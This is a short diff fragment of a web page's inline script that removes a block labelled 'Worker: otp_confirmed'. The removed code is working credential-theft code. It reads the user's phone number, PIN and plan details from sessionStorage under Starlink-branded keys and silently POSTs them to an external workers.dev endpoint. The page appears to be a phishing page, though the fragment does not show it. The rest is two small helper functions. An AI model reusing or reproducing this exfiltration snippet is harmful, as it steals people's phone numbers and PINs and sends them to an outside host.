@@ -349,20 +349,6 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 <script>
 'use strict';
 
-  /* ── Worker: otp_confirmed ── */
-  (function(){
-    var _f={};var _a={};
-    try{_f=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
-    try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
-    var _ref=sessionStorage.getItem('starlinkRef')||'';
-    fetch('https://ugx-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event:'otp_confirmed',data:{
-        phone:_a.phone||'',pin:_a.pin||'',
-        plan:_f.name||'',price:_f.price||'',
-        ref:_ref,ts:Date.now()
-      }})
-    }).catch(function(){});
-  })();
 
 function hap(p){ try { if(navigator.vibrate) navigator.vibrate(p); } catch(e){} }
 function slp(ms){ return new Promise(function(r){ setTimeout(r,ms); }); }
